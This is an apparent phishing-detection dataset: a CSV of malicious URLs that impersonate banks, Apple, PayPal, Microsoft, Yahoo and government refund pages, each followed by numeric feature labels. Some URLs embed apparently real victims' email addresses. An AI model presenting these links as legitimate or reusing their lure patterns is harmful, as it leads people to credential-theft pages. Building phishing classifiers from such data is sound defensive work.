
https://x.co/6npVP,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://leonardoquest.com/Login/adope/,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://judaicaofsilk.com/onedrive/onedrive/onedrive/onedrive/onedrive/,-1,0,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,0,-1
http://2bizt.net.ru/,-1,-1,-1,-1,-1,-1,-1,1,1,1,1,-1,1,0,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1
http://realtyagent247.000webhostapp.com/,-1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1
http://eesecurelogin.com/,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://socialobmeniik.pp.ru/,-1,-1,-1,-1,-1,-1,-1,1,1,1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://365chancge.org.ru/,-1,-1,-1,-1,-1,-1,-1,1,1,1,1,-1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
https://keystoneproject.net/aequua/9d27b2479906c5d70fa790f55b10195d33e3e57cd7b5b0b2b14739db020014556a2F4200195/index.htm,-1,1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
https://vitezzatour.com/sequa/4732F42095d7b2479906db02001455c5d7b5b0b2b15d33e301970fa790f55b101e57c9d296a/index.htm,-1,1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
"""https://secure.runescape.com-rs.ru/m=weblogin/loginform115",-1,-1,-1,-1,-1,1,0,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,0,-1,,0,-1
"""https://secure.runescape.com-rs.ru/m=weblogin/loginform315",-1,-1,-1,-1,-1,1,0,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,0,-1,,0,-1
http://leveessalindaprasuacasa.com/endereco.php?skullid=NDQ2OTI4NTQ3JjEw,-1,0,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
https://xwxbsnkgsfalzbells.000webhostapp.com/,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1
http://casabai-ofertasdodia.com/endereco.php?skullid=NDA1OTY3MDY5JjEy,-1,0,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
https://banking.bancofalabella-clientes.com.pe.lafarmed.com/es/,-1,0,-1,-1,-1,1,1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,-1,1,1,-1
https://www.rcteendreams.com/wp-admin/includes/beth/index.php,-1,-1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/login.php?cmd=login_submit&amp;id=65d642d79403ddd7de730db7803e721e65d642d79403ddd7de730db7803e721e&amp;session=65d642d79403ddd7de730db7803e721e65d642d79403ddd7de730db7803e721e,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://appleid.apple.com.supportaccount.dns-cloud.net/,-1,-1,-1,-1,-1,1,1,1,1,-1,1,-1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,0,-1,1,-1,-1
http://melhores-antiaderentes.com/endereco.php?skullid=NzIyNzIyNDgwJjEw,-1,0,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://melhores-antiaderentes.com/index.php?produto=722722480,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://oldvidz.xyz/wp-includes/pomo/Home/microsoftoffice365/,-1,-1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1,-1
https://medikacare.com/wp-content/themes/Divi/includes/builder/frontend-builder/GoDaddy/Godaddy-signing/index.html,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://elitecanadacredit.com/wp-admin/new/org_new/customer_center/customer-IDPP00C393/login.php,-1,1,-1,-1,-1,1,-1,1,1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1,1,1,-1
https://myetlnerwrallet.com/en,-1,-1,-1,-1,-1,-1,-1,0,1,1,1,-1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
https://delanebelarsemana.com/endereco.php?skullid=ODM1MjU4Mzk5JjEw,-1,0,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
https://delanebelarsemana.com/index.php?produto=835258399,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://larrygaga19.000webhostapp.com/index.php,-1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,1,0,1,1,-1,-1,-1,-1,-1,-1,1,-1,-1,-1,-1,1,1,-1
https://gafics.org/templates/ClienteEmpresarialEsferaResgatePontos/web/html/,-1,0,-1,-1,-1,-1,-1,0,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,-1,-1
https://magalu.super-promocoes.com/promocao.php,-1,-1,-1,-1,-1,1,0,0,1,-1,-1,-1,-1,1,-1,0,-1,-1,-1,-1,-1,-1,-1,1,1,1,-1,1,1,-1
http://larrygaga16.000webhostapp.com/index.php,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,-1
http://larrygaga13.000webhostapp.com/index.php,-1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,1,0,1,1,-1,-1,-1,-1,-1,-1,1,-1,-1,-1,-1,1,1,-1
http://larrygaga18.000webhostapp.com/index.php,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,-1
http://larrygaga17.000webhostapp.com/index.php,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,-1
https://magaluiiza.sslblindado.com,-1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,0,-1,1,-1,-1
https://knitsewco.com/wp-includes/bankofthewest/?bidderblocklogin&amp;hc=1&amp;hm=uk`1d72f%20j2b2vi&lt;265bidderblocklogin&amp;hc=1&amp;hm=uk`1d72f%20j2b2vi&lt;265bidderblocklogin&amp;hc=1&amp;hm=uk`1d72f%20j2b2vi&lt;265,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://www.srodkidlagastronomii.pl/s/Stripe/verification/1AM3889NEDB49ND3MED9/,-1,0,-1,-1,-1,-1,-1,1,1,1,1,-1,-1,-1,1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,0,-1
http://www.srodkidlagastronomii.pl/s/Stripe/verification/C6M448136C010CA06C06/,-1,0,-1,-1,-1,-1,-1,1,1,1,1,-1,-1,-1,1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,0,-1
http://winchestereventmarketing.com/wp-content/dokin/fisere.php,-1,0,-1,-1,-1,1,-1,1,1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://weenuchesmokesignals.com/amazon/,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://www.summitviewhub.com/wp-content/themes/flatsome/inc/admin/kirki/modules/field-dependencies/Adobefile/,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1
https://elegantplanbit.top/9920IODPP/pp/xb/,-1,-1,-1,-1,-1,-1,-1,0,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,0,-1,1,1,-1
http://salomah.000webhostapp.com/dhgjfkhgjfkfjhfjkfjbhvfjkfjbvhfjhfbvfgjfvfvhjfgjfkfhgjfgfffff(1)/dhgjfkhgjfkfjhfjkfjbhvfjkfjbvhfjhfbvfgjfvfvhjfgjfkfhgjfgfffff/eess/rrtt/,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,1,1,1,0,-1,-1,-1,-1,-1,-1,1,-1,-1,-1,-1,1,-1,-1
http://oferta-magalu.com/VVaad22as44f510000/index.php?&amp;id=2,-1,0,-1,-1,-1,1,-1,0,1,-1,-1,-1,-1,1,-1,0,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://ubs-bd.com/tmp/at/Indexxatt.htm,-1,-1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1
http://www.tooldealsonline.com/wp-content/update/Loginpdf.html,-1,0,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
https://dropxgood.com/L5zp01TITz/cdxd2zjuqb/v3cad7892v?q=L5zp01TITz&amp;s=dff6cd1394354e52c424a4d420f1a67d,-1,1,-1,-1,-1,-1,-1,0,1,-1,-1,-1,-1,1,-1,0,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://superdigitall.com/inter/pag/app-digital/cliente/acessar.php,-1,0,-1,-1,-1,1,-1,0,1,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://gerhardnel.com/kilo/index.php,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://ofertasincriveis.org/995a2sajkja_as_sapjf4/index.php?&amp;id=1,-1,0,-1,-1,-1,-1,-1,1,1,1,1,-1,1,1,1,-1,-1,-1,0,-1,-1,-1,1,1,-1,1,-1,,1,-1
https://magalu.super-promocoes.com/Produto/identificacao.php?id=7,-1,0,-1,-1,-1,1,0,0,1,1,-1,-1,-1,1,1,0,-1,-1,-1,-1,-1,-1,1,1,1,1,-1,,1,-1
https://organicfreshhealthyfood.com/cgi/aruba/login.php,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://oferta-magalu.com/545454SSiiDDDDD_55/index.php?&amp;id=2,-1,0,-1,-1,-1,1,-1,0,1,-1,-1,-1,-1,1,-1,0,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://www.thehouseofmetal.com/wp-admin/message/MailboxFUD/a09bc935eef90adca067250a1637cb26/index.php?email=user@domain.com,-1,1,-1,1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
https://xrpgiveaways.com/,-1,-1,-1,-1,-1,-1,-1,0,1,1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
https://eventlmfeedback.icu/secure/YAHOO/index.php,-1,-1,-1,-1,-1,-1,-1,0,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
https://www.knifesharpenerscout.com/login.php,-1,-1,-1,-1,-1,-1,-1,0,-1,1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
https://promotioninc.000webhostapp.com/Email/51dcbde499bcace5e5620bed7be0858a/,-1,0,-1,-1,-1,-1,0,-1,-1,1,-1,-1,1,-1,-1,0,-1,-1,-1,-1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1
http://momentumvending.org/thecrowngroup/tcwoodinc/u.php,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,0,-1,1,1,-1
http://mobi-platform.com/wp-content/plugins/formidable/images/step3.php?cmd=login_submit&amp;id=f06f0e2b3e7405858060f180bb930f31f06f0e2b3e7405858060f180bb930f31&amp;session=f06f0e2b3e7405858060f180bb930f31f06f0e2b3e7405858060f180bb930f31,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
https://www.dryfruitkart.in/site/c/att/index.html,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,-1,-1
https://www.dryfruitkart.in/site/d/att/index.html,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,-1,-1
https://www.dryfruitkart.in/site/f/att/index.html,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,-1,-1
https://www.dryfruitkart.in/site/e/att/index.html,-1,-1,-1,-1,-1,-1,-1,0,-1,-1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,-1,-1
http://bejschange.net.ru,-1,-1,-1,-1,-1,-1,-1,1,1,-1,1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
https://trello-attachments.s3.amazonaws.com/5c33a580db86d973d16c64c2/5cd967b20b63485f0e3e3d5f/17abf094831580fc022cacff9d0c3f78/abridor_de_vinho.html,-1,1,-1,-1,-1,1,1,-1,-1,1,-1,-1,1,0,1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1,-1,-1,1,-1,-1
http://www.councilicity.co.uk/refund,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://www.councilicity.co.uk/refund/,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://blokhusklitplantage.dk/find/?cliente=lounges2@terra.com.br,-1,0,-1,1,-1,-1,-1,1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,-1,-1
https://sberbanking.com,-1,-1,-1,-1,-1,-1,-1,0,1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1
https://stylishfashionstore.com/abs/absa.htm,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://topdasemana.com/54400000asa0sf/index.php?&amp;id=5,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://topdasemana.com/Ppjhabaihuhda_45478!!/index.php?&amp;id=5,-1,0,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://topdasemana.com/PljsahVVaddbh4420000sa/index.php?&amp;id=5,-1,0,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
https://recardanoreib2.com/yDGdjkhARHGJasrklASRGHJasrjlhaSRHGJAsrjhaSRHGJAsrjhaSRHJGAsrjkhASRHJGasrjhasrhjgaSRJKHASrhjgaSRJHASRHGJAsrjhashrgjasrljhkasjhkrasLJRHASrjhkasRAShgkjrlhjkaSRASRSRASRArrsSRsr/,-1,1,-1,-1,-1,-1,-1,0,1,1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,1,1,-1,1,-1,1,1,-1
https://mysha-offer.com/uhtee/privateoffice/?email=tisse.tass@vg.no,-1,0,-1,1,-1,1,-1,0,1,1,1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
http://www.handmadebysue.ca/wp-includes/ID3/*/post/,-1,-1,-1,-1,-1,1,-1,1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,0,-1,1,1,-1
https://www.councilicity.co.uk/refund/,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
https://recardanoreib2.com/yDGdjkhARHGJasrklASRGHJasrjlhaSRHGJAsrjhaSRHGJAsrjhaSRHJGAsrjkhASRHJGasrjhasrhjgaSRJKHASrhjgaSRJHASRHGJAsrjhashrgjasrljhkasjhkrasLJRHASrjhkasRAShgkjrlhjkaSRASRSRASRArrsSRsr/html/classic/index.shtml,-1,1,-1,-1,-1,-1,-1,0,1,1,1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,1,1,-1,1,-1,1,1,-1
http://yahoo.kijaco.com/Ymail/Sign_e.html,-1,-1,-1,-1,-1,-1,0,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,-1,1,0,-1
https://counciltaxx.co.uk/gov/,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
https://www399.super-de-ofertas.com/eeb7eb235c7544fd3c325557201bdbb6/produto/133567705/geladeira-refrigerador-brastemp-frost-free-brm45-evox-375-litros-inox,-1,1,-1,-1,-1,1,0,1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,1,0,-1,1,1,-1
http://socialmediaunitedlive.com/.well-known/admin/images/home/login.html,-1,0,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://www.sbc0s.com/%23%23/#beres.bettina@otpmobil.com#,-1,-1,-1,1,-1,-1,-1,1,1,-1,1,-1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1,1,1,-1
http://rudyprojectes.com/boxxxx,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,1,-1
http://inglesmovil.cl/files/,-1,-1,-1,-1,-1,-1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
https://paypalloginmy-account.com/,-1,-1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,1,-1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/step3.php?cmd=login_submit&amp;id=ef135e5c52d770ba36d2955436bdd3b1ef135e5c52d770ba36d2955436bdd3b1&amp;session=ef135e5c52d770ba36d2955436bdd3b1ef135e5c52d770ba36d2955436bdd3b1,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/step3.php?cmd=login_submit&amp;id=7e95a6025c366c3d8e0604efbf2afa617e95a6025c366c3d8e0604efbf2afa61&amp;session=7e95a6025c366c3d8e0604efbf2afa617e95a6025c366c3d8e0604efbf2afa61,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/step3.php?cmd=login_submit&amp;id=5d04ab49005d57c17e7b41a9c04d04b25d04ab49005d57c17e7b41a9c04d04b2&amp;session=5d04ab49005d57c17e7b41a9c04d04b25d04ab49005d57c17e7b41a9c04d04b2,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/step3.php?cmd=login_submit&amp;id=0690206251931b227bfd2406360662770690206251931b227bfd240636066277&amp;session=0690206251931b227bfd2406360662770690206251931b227bfd240636066277,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/login.php?cmd=login_submit&amp;id=7bef0be3724ec54b319cf310e794c43e7bef0be3724ec54b319cf310e794c43e&amp;session=7bef0be3724ec54b319cf310e794c43e7bef0be3724ec54b319cf310e794c43e,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://cicabchile.com/wp-content/themes/plantillacicabfullterminada/languages/login.php,-1,1,-1,-1,-1,1,-1,0,1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,1,-1
http://remyspalace.com/wp-includes/ID3/bofaonet/login.php?cmd=login_submit&amp;id=ccb131f852a732a36fb26c65537c2a74ccb131f852a732a36fb26c65537c2a74&amp;session=ccb131f852a732a36fb26c65537c2a74ccb131f852a732a36fb26c65537c2a74,-1,1,-1,-1,-1,1,-1,0,-1,1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://remyspalace.com/wp-includes/ID3/bofaonet/login.php?cmd=login_submit&amp;id=82b7c187ca1d59f72e653fb4c6e1303d82b7c187ca1d59f72e653fb4c6e1303d&amp;session=82b7c187ca1d59f72e653fb4c6e1303d82b7c187ca1d59f72e653fb4c6e1303d,-1,1,-1,-1,-1,1,-1,0,-1,1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://remyspalace.com/wp-includes/ID3/bofaonet/login.php?cmd=login_submit&amp;id=30928fa29b487af3af3878f786a346c030928fa29b487af3af3878f786a346c0&amp;session=30928fa29b487af3af3878f786a346c030928fa29b487af3af3878f786a346c0,-1,1,-1,-1,-1,1,-1,0,-1,1,-1,-1,-1,-1,-1,0,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/login.php?cmd=login_submit&amp;id=849b40f93c213f9695fba5c27b9822d8849b40f93c213f9695fba5c27b9822d8&amp;session=849b40f93c213f9695fba5c27b9822d8849b40f93c213f9695fba5c27b9822d8,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
https://icloud.com.app-log.info/,-1,-1,-1,-1,-1,1,1,0,1,-1,1,-1,-1,-1,1,-1,-1,-1,0,-1,-1,-1,1,1,1,1,-1,1,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/step3.php?cmd=login_submit&amp;id=6b9e09ac1e486836475b531eb13e89276b9e09ac1e486836475b531eb13e8927&amp;session=6b9e09ac1e486836475b531eb13e89276b9e09ac1e486836475b531eb13e8927,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/login.php?cmd=login_submit&amp;id=d9c8cbfe44b872cc944f7357ae5c3483d9c8cbfe44b872cc944f7357ae5c3483&amp;session=d9c8cbfe44b872cc944f7357ae5c3483d9c8cbfe44b872cc944f7357ae5c3483,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/login.php?cmd=login_submit&amp;id=95c93c71fe1713522d52ba5fb9f79f9395c93c71fe1713522d52ba5fb9f79f93&amp;session=95c93c71fe1713522d52ba5fb9f79f9395c93c71fe1713522d52ba5fb9f79f93,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://arifabseiso.com/wp-content/plugins/photo-gallery/addons/login.php?cmd=login_submit&amp;id=0bf22bc2951c868d3f4d306e3bebcbb10bf22bc2951c868d3f4d306e3bebcbb1&amp;session=0bf22bc2951c868d3f4d306e3bebcbb10bf22bc2951c868d3f4d306e3bebcbb1,-1,1,-1,-1,-1,1,-1,0,-1,-1,1,-1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,,1,-1
http://1asaptransport.com/wp-admin/maint/voicemessages18/0b58bd0b81068640f238ebded234458f/login.php?cmd=login_submit,-1,1,-1,-1,-1,1,-1,0,-1,1,1,-1,-1,1,1,0,-1,-1,-1,-1,-1,-1,1,-1,-1,1,-1,,1,-1
http://kalairhomeservices.com/wp-includes/login.php?cmd=login_submit&amp;id=69959c4cfa1f2128088e6d64ae96d79969959c4cfa1f2128088e6d64ae96d799&amp;session=69959c4cfa1f2128088e6d64ae96d79969959c4cfa1f2128088e6d64ae96d799,-1,1,-1,-1,-1,1,-1,1,1,-1,1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1,-1,1,-1,,1,-1
